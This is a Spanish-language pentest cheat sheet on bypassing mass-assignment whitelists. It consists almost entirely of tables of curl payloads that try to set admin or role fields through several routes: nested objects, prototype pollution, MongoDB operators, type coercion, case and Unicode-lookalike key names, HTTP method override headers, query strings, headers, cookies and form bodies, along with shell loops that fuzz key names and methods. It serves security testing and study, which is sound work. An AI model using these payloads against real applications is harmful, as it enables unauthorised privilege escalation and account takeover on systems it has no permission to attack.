---
aliases:
  - Mass Assignment Bypass
  - Nested Object Injection
  - Snake Camel Bypass
tags:
  - type/technique
  - vuln/mass-assignment
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Mass Assignment]]'
---
# Mass Assignment - Bypass de Whitelists

***

## Nested Object Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl ... -d '{"user":{"name":"x","role":{"name":"admin"}}}'` | Privesc via nested role object | Backend acepta role nested. |
| `curl ... -d '{"user":{"name":"x","addresses_attributes":[{"role":"admin"}]}}'` | Rails accept_nested_attributes inject | Rails con nested attrs API. |
| `curl ... -d '{"profile":{"user":{"is_admin":true}}}'` | Multi-level nested injection | App con profile + user nested. |
| `curl ... -d '{"item":{"_type":"User","is_admin":true}}'` | Polymorphic type confusion | App con polymorphic relations. |
| `curl ... -d '{"order":{"user_id":1,"items":[{...}]}}'` | Hijack ownership via nested user_id | Belongs-to relations. |
| `curl ... -d '{"__proto__":{"isAdmin":true}}'` | Prototype Pollution + Mass Assign combo | App usa lodash `_.merge` o `_.set`. |
| `curl ... -d '{"constructor":{"prototype":{"isAdmin":true}}}'` | PP variant cuando filter strip `__proto__` | Filter incompleto. |
| `{"query":"mutation{update(input:{user:{role:\"admin\"}}){id}}"}` | GraphQL nested input inject | Mutation con nested input type. |
| `curl ... -d '{"$set":{"isAdmin":true}}'` | MongoDB operator nested inject | App pasa body directo a Mongoose. |
^ma-bypass-nested

___

## Array vs Object Polyglot

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl ... -d '{"roles":["admin","user"]}'` | Array roles inject | Backend espera string `role`, acepta `roles` array. |
| `curl ... -d '{"role":{"name":"admin"}}'` | Object override de string scalar | Backend valida tipo string pero pasa al ORM. |
| `curl ... -d '{"id":[1,2,3]}'` | Array para `id` (backend pick first) | Type coercion en filter. |
| `curl ... -d '{"isAdmin":"true"}'` | Boolean as string coercion | JSON parser permisivo. |
| `curl ... -d '{"is_admin":1}'` | Numeric truthy coercion | Backend interpreta truthy. |
| `curl ... -d '{"is_admin":{}}'` | Object truthy en JS backend | Node.js lax check. |
| `curl ... -d '{"role":null}'` | Null delete field interpretation | Algunos ORMs delete en null. |
| `curl ... -d '{"role":""}'` | Empty string reset a default | Default puede ser admin en bug. |
| `curl ... -d '{"data":"{\"isAdmin\":true}"}'` | JSON stringified — backend re-parsea | Double-parse vulnerability. |
| `curl ... -d '{"roles":[]}'` | Array vacío reset roles | Reset to empty bypass restriction. |
^ma-bypass-types

___

## Case Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl ... -d '{"isAdmin":true}'` y `curl ... -d '{"is_admin":true}'` | Probe ambas convenciones | Filter solo bloquea una. |
| `curl ... -d '{"IsAdmin":true}'` (PascalCase) | .NET-style naming | Backend .NET. |
| `curl ... -d '{"IS_ADMIN":true}'` (uppercase) | Constant naming | Filter case-sensitive lowercase. |
| `curl ... -d '{"iS_AdMiN":true}'` (mixed case) | Random case bypass | Filter case-sensitive. |
| `curl ... -d '{"is_admin ":true}'` (trailing space) | Strip varies | Filter no normaliza whitespace. |
| `curl ... -d '{" is_admin":true}'` (leading space) | Same | Same. |
| `curl ... -d '{"_isAdmin":true}'` o `{"$isAdmin":true}'` | Underscore/dollar prefix | Lib strip leading char. |
| `curl ... -d '{"user.isAdmin":true}'` (dot notation) | Path-based key | Lib parsea como path. |
| `curl ... -d '{"іsAdmin":true}'` (Cyrillic 'і') | Unicode lookalike | Filter ASCII-only check. |
| `curl ... -d '{"is%5Fadmin":true}'` (URL-encoded `_`) | Decode-after-filter | Filter pre-decode. |
| `for f in isAdmin is_admin IsAdmin IS_ADMIN admin role roles is-admin; do curl ... -d "{\"$f\":true}"; done` | Bulk fuzz convenciones | No conocés naming. |
^ma-bypass-case

___

## HTTP Method Override

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PATCH https://target/users/1 -d '{"isAdmin":true}'` | Bypass strict PUT validation | App valida PUT pero PATCH suelto. |
| `curl -X POST https://target/users/1 -H "X-HTTP-Method-Override: PUT" -d '{"isAdmin":true}'` | Method override header | Spring/Symfony con override habilitado. |
| `curl -X POST https://target/users/1 -d '_method=PUT&isAdmin=true'` | Method override body | Rails/Laravel pattern. |
| `curl -X POST https://target/users/bulk -d '[{"id":1,"isAdmin":true}]'` | Bulk endpoint sin per-field validation | Bulk endpoints suelto. |
| `curl -X POST https://target/import -d @users.json` | Import endpoint con full DTO | Import flow skip validation. |
| `curl -X POST https://target/admin/users -d '{"isAdmin":true}'` | Shadow admin endpoint | Endpoint admin sin auth check. |
| `curl https://target/v1/users/1 -X PATCH ...` y `https://target/v2/users/1 -X PATCH ...` | Diferentes code paths por version | API versioning con bug. |
| `curl -X OPTIONS https://target/users/1` con body | Exotic method bypass | App responde a OPTIONS con write. |
| `for m in PUT PATCH POST DELETE PROPFIND COPY; do curl -X $m ... -d '{"isAdmin":true}'; done` | Method matrix probe | Brute force methods. |
^ma-bypass-method

___

## Query String vs Body

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PUT 'https://target/users/1?is_admin=true' -d '{"name":"x"}'` | Inject via query string | Backend mergea query + body. |
| `curl ... -H "X-Is-Admin: true" -d '{"name":"x"}'` | Inject via custom header | App lee header y mergea. |
| `curl ... -H "Cookie: is_admin=true" -d '{"name":"x"}'` | Inject via cookie | Backend trust cookie content. |
| `curl -X PUT https://target/users/1 -F "name=x" -F "is_admin=true"` (multipart) | Bypass JSON validator | App parsea multipart con menos checks. |
| `curl -X POST https://target/users/1 -d 'name=x&is_admin=true'` (form-urlencoded) | Form bypass JSON-only validator | App acepta ambos content types. |
| `curl -G 'https://target/graphql' --data-urlencode 'query=mutation{updateUser(isAdmin:true){id}}'` | GraphQL via GET | Engine acepta GET para mutations. |
| `curl -X POST https://target/users/1 -H "Prefer: return=representation,is_admin=true" ...` | Header `Prefer` field inject | OData-style API. |
| `for src in 'query' 'header' 'cookie' 'body' 'form'; do ...; done` | Probe sources | Identificar dónde el server lee. |
^ma-bypass-query

***
